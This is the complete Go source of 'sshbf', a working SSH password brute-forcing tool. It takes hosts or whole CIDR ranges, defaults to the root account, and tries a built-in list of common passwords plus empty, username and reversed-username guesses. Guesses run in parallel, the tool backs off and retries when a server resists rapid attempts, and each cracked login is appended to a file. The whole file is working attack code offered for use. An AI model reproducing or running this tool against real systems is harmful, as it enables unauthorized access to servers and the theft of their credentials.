// sshbf is a simple SSH Brute-Forcer.

/*
 * sshbf.go
 * Simple SSH bruteforcer
 * by J. Stuart McMurray
 * created 20140717
 * last modified 20140722
 */

package main

import (
	"bufio"
	"code.google.com/p/go.crypto/ssh"
	"container/list"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
)

/* attempt contains all the data needed for an attempt to guess a password */
type attempt struct {
	User   string
	Pass   string
	Host   string
	Config *ssh.ClientConfig
	Remove bool
}

/* New makes a new attempt from a template with Pass and Config filled in, and
a version string of v. */
func (a attempt) New(p, v string) attempt {
	var n attempt
	n.User = a.User
	n.Host = a.Host
	n.Pass = p
	n.Config = &ssh.ClientConfig{
		User: n.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(n.Pass),
		},
		ClientVersion: v,
	}
	return n
}

/* Used for removing hosts from the queue for a reason */
type badHost struct {
	Host   string
	Reason string
}

/* Internal password list */
var IPL []string = []string{"admin", "password", "1234", "12345", "123456",
	"test", "oracle"}

/* Default connect timeout */
var deftimeout string = "2m"
var retrywait string = "1s"

/* Number of attempts floating around */
var nAttempt struct {
	sync.RWMutex        /* Has to be done manually */
	DoneGenerating bool /* True if we're done generating attempts */
	N              int  /* Number of attempts remaining */
}

func main() {

	/* Slice of username/password combinations */
	templates := list.New()
	alock := &sync.RWMutex{}

	/* Initial list of passwords to guess */
	initpw := []string{}

	var sf *os.File = nil

	/* Command-line arguments */
	userf := flag.String("user", "", "Single SSH username.  If neither "+
		"this nor -ufile is specified, root will be used.")
	passf := flag.String("pass", "", "Single SSH password.  If neither "+
		"this nor -pfile is specified, a small internal list of "+
		"passwords will be attempted.  See -plist.")
	hostf := flag.String("host", "", "Host to attack.  This is, of "+
		"course, required.  Examples: foo.bar.com, "+
		"foo.baaz.com:2222.  Either this or -hfile must be "+
		"specified.  CIDR notation may be used to specify multiple "+
		"addresses at once.")
	ufilef := flag.String("ufile", "", "File with a list of usernames, "+
		"one per line.  If neither this nor -user is specified, the "+
		"single username root will be used.  This list will be "+
		"read into memory, so it should be kept short on low-memory "+
		"systems.")
	pfilef := flag.String("pfile", "", "File with a list of passwords, "+
		"one per line.  If neither this nor -pass is specified, a "+
		"small internal list of passwords will be attempted.  See "+
		"-plist.")
	hfilef := flag.String("hfile", "", "File with a list of hosts to "+
		"attack, one per line.  Either this or -host must be "+
		"specified.  This list will be read into memory, so it "+
		"should be kept short on low-memory systems.  CIDR notation "+
		"may be used to specify multiple addresses at once.")
	pnullf := flag.Bool("pnull", false, "Attempt the null (empty) "+
		"password as well as other specified passwords.")
	puserf := flag.Bool("puser", false, "Attempt the username as the "+
		"password as well as other specified passwords.")
	pbackf := flag.Bool("pback", false, "Attempt the username backwards "+
		"as the password as well as other specified passwords.  "+
		"E.g. root -> toor.")
	pdeflf := flag.Bool("pdefl", false, "Attempt the internal default "+
		"password list.")
	sshvsf := flag.String("sshvs", "SSH-2.0-sshbf_0.0.1", "SSH version "+
		"string to present to the server.")
	ntaskf := flag.Int("ntask", 4, "Number of attempts (tasks) to run in "+
		"parallel.  Don't set this too high.")
	triesf := flag.Bool("tries", false, "Print every guess.")
	stdinf := flag.Bool("stdin", false, "Ignore most of the above and "+
		"read tab-separated username<tab>password<tab>host lines from "+
		"stdin.  NOT CURRENTLY IMPLEMENTED.")
	plistf := flag.Bool("plist", false, "Print the internal default "+
		"password list and exit.")
	deftimeoutd, err := time.ParseDuration(deftimeout)
	sfilef := flag.String("sfile", "", "Append successful "+
		"authentications to this file, which whill be flock()'d to "+
		"allow for multiple processes to write to it in parallel.")
	onepwf := flag.Bool("onepw", false, "Only find ose username/password "+
		"pair per host.")
	if err != nil {
		fmt.Printf("Invalid default wait duration.\n\n.")
		fmt.Printf("This is a bad bug.\n\n")
		fmt.Printf("You should tell the developers.\n")
		os.Exit(-6)
	}
	waitf := flag.Duration("wait", deftimeoutd, "Wait this long for "+
		"authentication to succeed or fail.")
	flag.Parse()

	/* Print usage if no arguments */
	if len(os.Args) == 1 {
		flag.PrintDefaults()
	}

	/* If we're just printing the password list, do so and exit */
	if *plistf {
		fmt.Printf("Internal password list:\n")
		for _, p := range IPL {
			fmt.Printf("\t%v\n", p)
		}
		return
	}

	/* If we're to read from stdin, we can skip a lot of work */
	if *stdinf {
		log.Printf("Reading from stdin not currently implemented.\n")
		os.Exit(-1)
	} else {
		/* Work out the list of targets and usernames */
		ft, err := readLines(*hostf, *hfilef)
		targets := []string{}
		if err != nil {
			log.Printf("Unable to read target hosts from %v: "+
				"%v.\n", *hfilef, err)
			os.Exit(-2)
		}
		/* Parse CIDR names */
		for _, t := range ft {
			/* Not CIDR */
			if !strings.ContainsRune(t, '/') {
				targets = append(targets, t)
				continue
			}
			/* CIDR */
			ip, in, err := net.ParseCIDR(t)
			/* Shouldn't happen, but typos happen. */
			if err != nil {
				log.Printf("%v does not appear to be CIDR "+
					"notation.  Adding it to target list "+
					"anyways.", t)
				targets = append(targets, t)
				continue
			}
			/* Add all addresses in netblock */
			for i := ip.Mask(in.Mask); in.Contains(i); incIP(i) {
				targets = append(targets, i.String())
			}
		}
		if len(targets) == 0 {
			log.Printf("Not enough target hosts specified.  " +
				"Please use -host and/or -hfile.\n")
			os.Exit(-4)
		}

		unames, err := readLines(*userf, *ufilef)
		if err != nil {
			log.Printf("Unable to read usernames from %v: %v.\n",
				*ufilef, err)
			os.Exit(-3)
		} else if len(unames) == 0 {
			/* Default to root only */
			unames = append(unames, "root")
		}

		/* Make sure the targets have ports */
		for i, t := range targets {
			if _, _, err := net.SplitHostPort(t); err != nil {
				targets[i] = net.JoinHostPort(t, "22")
			}
		}

		/* Make a list of passwordless ssh configs */
		for _, u := range unames {
			for _, t := range targets {
				templates.PushBack(&attempt{User: u, Host: t,
					Remove: false})
			}
		}

		/* Work out a list of initial passwords */
		if *passf != "" { /* Password on command line */
			initpw = uniqueAppend(initpw, *passf)
		}
		if *pnullf { /* Use null password */
			initpw = uniqueAppend(initpw, "")
		}
		if *puserf { /* Username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, u)
			}
		}
		if *pbackf { /* Backwards username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, reverse(u))
			}
		}
		if *pdeflf { /* Internal default password list */
			for _, p := range IPL {
				initpw = uniqueAppend(initpw, p)
			}
		}
		if len(initpw) == 0 && *pfilef == "" { /* If all else fails */
			initpw = IPL
		}

	}

	/* TODO: Read username\tpassword\thost tuples from stdin */

	/* Channel through which to send tasking to tasks */
	attemptc := make(chan attempt)

	/* Channel through which to report successes */
	successc := make(chan attempt)

	/* Dead hosts show up here */
	badhostc := make(chan badHost)

	/* Spawn off *ntaskf goroutines */
	for i := 0; i < *ntaskf; i++ {
		go sshTask(attemptc, successc, i, *triesf, *waitf, badhostc)
	}

	/* Generate username/password/host attempts */
	go attemptMaker(templates, initpw, *pfilef, attemptc, alock, *sshvsf)

	/* File to which to append successes */
	if *sfilef != "" {
		sf, err = os.OpenFile(*sfilef,
			os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
		if err != nil {
			fmt.Printf("Error opening success file %v: %v",
				*sfilef, err)
			os.Exit(-7)
		}
	}

	/* Exit after all the tasks have given up */
	for {
		select {
		case s := <-successc: /* Got a successful auth */
			log.Printf("SUCCESS: %v@%v %v", s.User, s.Host,
				textIfBlank(s.Pass))
			/* Log to the success file if we have one */
			if sf != nil {
				/* Try to get a lock */
				if err := syscall.Flock(int(sf.Fd()),
					syscall.LOCK_EX); err != nil {
					/* If not, log it */
					log.Printf("Not printing successful "+
						"password guess %v for %v@%v "+
						"due to error acquiring "+
						"exclusive lock on %v: %v",
						textIfBlank(s.Pass), s.User,
						s.Host, *sfilef, err)
				} else {
					/* If we got the lock, log the
					   password */
					/* TODO: Better "out of guesses"
					message to handle tasks starting
					after the message. */
					fmt.Fprintf(sf, "%v@%v %v\n", s.User,
						s.Host, textIfBlank(s.Pass))
				}
				/* In either case, (try to) unlock the file */
				syscall.Flock(int(sf.Fd()), syscall.LOCK_UN)
			}

			/* Determine whether to remove the one template or all
			   for the host. */
			var u string
			if !*onepwf {
				u = s.User
			}
			/* Remove template from list if we've got a password */
			removeTemplates(templates, u, s.Host, alock)
		case b := <-badhostc: /* Got notification a host is down */
			d := b.Host /* Hostname */
			/* If host is still in the templates, print a message */
			if removeTemplates(templates, "", d, alock) {
				log.Printf("%v removed from attack queue: "+
					"%v", d, b.Reason)
			}
		}
	}
}

/* incIP increments an IP Address */
func incIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] > 0 {
			break
		}
	}
}

/* maxIP tests if every byte in the IP address is 0xFF */
func maxIP(ip net.IP) bool {
	for _, b := range ip {
		if 0xFF != b {
			return false
		}
	}
	return true
}

/* Mark a user (u) and/or host (h) for removal from list of attempts.
If either user or host is "", it will not be considered.  alock will be
Lock()'d during the operation. */
func removeTemplates(l *list.List, u, h string, alock *sync.RWMutex) bool {
	/* Sanity-check */
	if u == "" && h == "" {
		return true
	}
	removed := false /* True if we remove an item */
	alock.Lock()
	/* Iterate through list */
	var next *list.Element
	for e := l.Front(); e != nil; e = next {
		next = e.Next()
		/* Type-convert */
		if t, ok := e.Value.(*attempt); ok &&
			((u == "") || (t.User == u)) &&
			((h == "") || (t.Host == h)) &&
			!t.Remove {
			t.Remove = true
			removed = true
		}
	}
	alock.Unlock()
	return removed
}

/* sshTask represents one parallelizable brute-forcer. attempts come in on
attemptc, and if a match is found, the userame, password, and host are sent
back on successc.  Tasknum is a unique identifier for this task. If triesf is
true, every attempt will to be printed. wait specifies how long each attempt
will wait, with an upper bound specified opaquely by the ssh library. */
func sshTask(attemptc chan attempt, successc chan attempt, tasknum int,
	triesf bool, wait time.Duration, badhostc chan badHost) {
	for {
		/* Get a new attempt */
		a, ok := <-attemptc
		var client *ssh.Client = nil
		/* Die if we aren't going to be needed any more. :( */
		if _, _, t := dieA(tasknum); t {
		//if n, d, t := dieA(tasknum); t {
			//log.Printf("[%v] Dying.  %v attempts remaining.",
			//	tasknum, n) /* DEBUG */
			return
		}

		/* Die if the channel's closed, which shouldn't happen. */
		if !ok {
			log.Printf("[%v] Task queue closed.  Please report "+
				"as a bug.", tasknum)
			os.Exit(-10)
		}
		suc := make(chan bool, 1)

		/* Got an attempt */
		// log.Printf("[%v] Got attempt: %v - %v", tasknum, a,
		// 	nA()) /* DEBUG */

		/* Send data on a channel when we're done */
		go func() {
			/* Print the attempt if requested */
			if triesf {
				log.Printf("[%v] Attempting %v@%v - %v",
					tasknum, a.User, a.Host,
					textIfBlank(a.Pass))
			}
			/* Attempt to connect to server and authenticate. */
			_, err := ssh.Dial("tcp", a.Host, a.Config)
			/* Connection worked */
			if err == nil {
				suc <- true
				return
			}
			/* Take action depending on the type of the error */
			/* Too many open files -> requeue attempt, sleep */
			if e, ok := err.(*net.OpError); ok &&
				strings.HasSuffix(e.Error(),
					"too many open files") {
				w, err := time.ParseDuration(retrywait)
				if err != nil {
					log.Printf("Unable to parse \"%v\" "+
						"as a time duration.  "+
						"Please report as a bug.",
						retrywait)
					os.Exit(-5)
				}
				log.Printf("[%v] Too many files (or network "+
					"connections) open, when trying %v "+
					"for %v@%v.  Sleeping %v and "+
					"requeuing.", tasknum, a.Pass, a.User,
					a.Host, w)
				time.Sleep(w)
				incA()
				//log.Printf("[%v] addN - too many files - %v",
				//	tasknum, nA()) /* DEBUG */
				attemptc <- a
				log.Printf("[%v] Requeued %v", tasknum, a)
			} else if e, ok := err.(*net.OpError); ok &&
				(strings.HasSuffix(e.Error(), "operation "+
					"timed out") || /* Host down */
					strings.HasSuffix(e.Error(),
						"host is down") ||
					strings.HasSuffix(e.Error(),
						"no route to host") ||
					strings.HasSuffix(e.Error(),
						"network is unreachable")) {
				badhostc <- badHost{Host: a.Host,
					Reason: "Target is down."}
				/* TODO: Work out segfault */
				/* TODO: "connection timed out" -> host doesn't exist (*net.OpError) */
			} else if e, ok := err.(*net.OpError); ok &&
				strings.HasSuffix(e.Error(),
					"connection refused") {
				badhostc <- badHost{Host: a.Host,
					Reason: "Connection refused."}
				/* TODO: Multicore enable */
			} else if e, ok := err.(*net.OpError); ok &&
				(strings.HasSuffix(e.Error(),
					"no such host") ||
					strings.HasSuffix(e.Error(),
						"invalid domain name") ||
					strings.HasSuffix(e.Error(),
						"connection timed out") ||
					strings.HasSuffix(e.Error(),
						"invalid argument")) {
				/* DNS Fail */
				badhostc <- badHost{Host: a.Host,
					Reason: "Does not exist (DNS Error?)."}
			} else if e, ok := err.(*net.OpError); ok &&
				strings.HasSuffix(e.Error(),
					"permission denied") {
				badhostc <- badHost{Host: a.Host,
					Reason: "Permission denied."}
			} else if e, ok := err.(error); ok &&
				(strings.HasSuffix(e.Error(), "ssh: no "+
					"common algorithms") ||
					strings.HasSuffix(e.Error(),
						"ssh: invalid packet length, "+
							"packet too large")) {
				badhostc <- badHost{Host: a.Host,
					Reason: "SSH Error"}
			} else if e, ok := err.(error); ok &&
				(strings.HasPrefix(e.Error(), "ssh: "+
					"handshake failed: ssh: unable to "+
					"authenticate") ||
					strings.HasPrefix(e.Error(), "ssh: "+
						"handshake failed: EOF")) {
				/* Auth failed */
			} else if e, ok := err.(error); ok &&
				strings.HasSuffix(e.Error(), "connection "+
					"reset by peer") {
				w, err := time.ParseDuration(retrywait)
				if err != nil {
					log.Printf("Unable to parse \"%v\" "+
						"as a time duration.  "+
						"Please report as a bug.",
						retrywait)
					os.Exit(-9)
				}
				log.Printf("[%v] Too many connection "+
					"attempts, too fast to %v, sleeping "+
					"%v and retrying last attempt.",
					tasknum, a.Host, w)
				time.Sleep(w)
				incA()
				//log.Printf("[%v] incA too many connection "+
				//	"- %v", tasknum, nA()) /* DEBUG */
				attemptc <- a
			} else { /* Who knows... */
				log.Printf("[%v] %v@%v - %v PLEASE REPORT "+
					"UNHANDLED ERROR (%T): %v", tasknum,
					a.User, a.Host, a.Pass, err, err)
			}
			suc <- false
		}()
		/* Set timeout */
		select {
		case s := <-suc:
			if s {
				successc <- a
			}
		case <-time.After(wait):
			/* Close the network connection if needed */
			if client != nil {
				client.Close()
			}
			badhostc <- badHost{Host: a.Host,
				Reason: fmt.Sprintf("Timeout after %v.",
					wait)}
			//log.Printf("[%v] Timeout: %v - %v", tasknum, a,
			//	nA()) /* DEBUG */
		}
		/* Finished an attempt */
		decA()
		// log.Printf("[%v] Attempt done %v - %v", tasknum, a,
		//	nA()) /* DEBUG */
	}
}

/* attemptMaker spews out attempts on attemptc based on the username/host pairs
in templates, which will be read only after calling RLock on alock.  It will
first cycle through the passwords in initpw, then read lines of pwfile for the
passwords. cv is used as the SSH client version. */
func attemptMaker(templates *list.List, initpw []string, pwfile string,
	attemptc chan attempt, alock *sync.RWMutex, cv string) {

	/* Message that we're starting */
	log.Printf("Trying %v Username/Host combinations.", templates.Len())

	/* For each password in initpw */
	for _, p := range initpw {
		if !broadcastPassword(p, templates, alock, attemptc, cv) {
			goto NoTargets
		}
	}

	/* Open pwfile */
	if pwfile != "" {
		pf, err := os.Open(pwfile)
		/* Make pwfile iterable */
		if err != nil {
			log.Printf("Unable to open password file %v: %v",
				pwfile, err)
			goto NoPasswords
		}
		scanner := bufio.NewScanner(pf)
		/* For each password in pwfile */
		for scanner.Scan() {
			if !broadcastPassword(scanner.Text(), templates, alock,
				attemptc, cv) {
				goto NoTargets
			}
		}
		/* Let the user know if there was an error reading pwfile */
		if err := scanner.Err(); err != nil {
			log.Printf("Error reading password file %v: %v",
				pwfile, err)
		}

	}
NoPasswords:
	/* If we're here, we're out of things to try. */
	log.Printf("Out of passwords.  Giving remaining attempts time to " +
		"complete.\n")

	/* Tell tasks they can die now. */
	doneA(true, true)
	//log.Printf("doneA %v - %v", doneA(false, false), nA()) /* DEBUG */

	goto Done
NoTargets:
	log.Printf("Out of targets.  Giving remaining attempts time to " +
		"complete.")
Done:
	return
}

/* broadcastPassword sends a password out on attemptc for all templates in
templates.  alock will be Locked before templates is read.  cv is used as the
SSH client version.  Returns false if templates is empty. */
func broadcastPassword(password string, templates *list.List,
	alock *sync.RWMutex, attemptc chan attempt, cv string) bool {
	/* Give up if the list is empty */
	if templates.Len() == 0 {
		return false
	}
	/* Get the first template element */
	alock.RLock()
	e := templates.Front()
	alock.RUnlock()

	/* Give up if there's no more templates */
	if e == nil {
		return false
	}

	var n *list.Element
	/* Cycle through good elements */
	for ; e != nil; e = n {
		alock.RLock()
		n = e.Next()
		alock.RUnlock()
		/* Get the template */
		t, ok := e.Value.(*attempt)
		if !ok {
			log.Printf("Undetermined corruption of " +
				"username/host list.  Please report as a bug.")
			os.Exit(-8)
		}
		/* Remove elements marked for removal */
		if t.Remove {
			alock.Lock()
			//log.Printf("Removing %v - %v", t, nA()) /* DEBUG */
			templates.Remove(e)
			alock.Unlock()
			continue
		}
		/* If there's no templates left, we're done */
		alock.RLock()
		if templates.Len() == 0 {
			log.Printf("No targets left in queue.")
			os.Exit(0)
		}
		alock.RUnlock()
		a := t.New(password, cv)
		//log.Printf("incA New %v - %v", a, nA()) /* DEBUG */
		incA()
		attemptc <- a
		//log.Printf("Sent attempt: %v - %v", a, nA()) /* DEBUG */
	}

	return templates.Len() != 0
}

func stdinAttemptMaker() {} /* TODO: Finish this */

/* Read lines from the file named file into a deduped, in-order slice,
optionally starting with leader if it is not the empty string.  It is not an
error if file is the empty string (in which case a slice containing only leader
will be returned), but it is an error if file cannot be read.  Windows line
endings may do strange things. */
func readLines(leader, file string) ([]string, error) {
	/* Initial collections */
	m := map[string]bool{}
	s := []string{}

	/* Add leader if it's not empty */
	if leader != "" {
		m[leader] = true
		s = append(s, leader)
	}

	/* Read from file if we have it */
	if file != "" {
		bytes, err := ioutil.ReadFile(file)
		if err != nil {
			return s, err
		}
		/* Remove single trailing newline (to prevent always having a
		   blank string */
		if bytes[len(bytes)-1] == '\n' {
			bytes = bytes[:len(bytes)-1]
		}
		/* Split the contents of the file into lines, append each
		   unique line */
		for _, h := range strings.Split(string(bytes), "\n") {
			/* Add the line if we don't already have it */
			if _, in := m[h]; !in {
				m[h] = true
				s = append(s, h)
			}
		}
	}
	return s, nil
}

/* reverse reverses a string */
func reverse(s string) string {
	// Get Unicode code points.
	n := 0
	rune := make([]rune, len(s))
	for _, r := range s {
		rune[n] = r
		n++
	}
	rune = rune[0:n]
	// Reverse
	for i := 0; i < n/2; i++ {
		rune[i], rune[n-1-i] = rune[n-1-i], rune[i]
	}
	// Convert back to UTF-8.
	return string(rune)
}

/* uniqueAppend appends a string to a slice only if the slice doesn't contain
the string.  Since it searches in O(n) time, it should only be used for
reasonably small slices */
func uniqueAppend(slice []string, s string) []string {
	/* Make sure s isn't in slice */
	for _, val := range slice {
		if val == s {
			return slice
		}
	}
	return append(slice, s)
}

/* textIfBlank returns "<blank>" if the input is "" */
func textIfBlank(s string) string {
	if s == "" {
		return "<blank>"
	}
	return s
}

/* Increment number of attempts. */
func incA() {
	nAttempt.Lock()
	nAttempt.N++
	nAttempt.Unlock()
}

/* Decrement number of attempts. */
func decA() {
	nAttempt.Lock()
	defer nAttempt.Unlock()
	nAttempt.N--
	/* If there's no attempts left and there's none left to be made, then
	   die. */
	if 0 == nAttempt.N && nAttempt.DoneGenerating {
		log.Printf("All attempts completed.")
		os.Exit(0)
	}
}

/* Get the number of attempts remaining. */
func nA() int {
	nAttempt.RLock()
	n := nAttempt.N
	nAttempt.RUnlock()
	return n
}

/* Test if we're done generating attempts.  Set it to val if set. */
func doneA(set, val bool) bool {
	if set {
		nAttempt.Lock()
		defer nAttempt.Unlock()
		nAttempt.DoneGenerating = val
	} else {
		nAttempt.RLock()
		defer nAttempt.RUnlock()
	}
	return nAttempt.DoneGenerating
}

/* dieA returns true if the number of attemps in the queue is less than n and
there's no more attempts to be generated. */
func dieA(n int) (int, bool, bool) {
	nAttempt.Lock()
	defer nAttempt.Unlock()
	var d bool
	if nAttempt.N < n && nAttempt.DoneGenerating {
		d = true
	}
	return nAttempt.N, nAttempt.DoneGenerating, d
}
